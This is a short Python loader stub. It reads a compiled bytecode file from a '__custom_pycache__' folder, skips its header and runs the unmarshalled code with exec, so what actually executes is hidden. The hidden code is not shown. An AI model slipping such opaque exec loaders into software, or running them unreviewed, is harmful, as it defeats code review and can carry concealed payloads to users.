
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'auxiliary_ee2147c149e9438e8ad291bece7b73fc.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
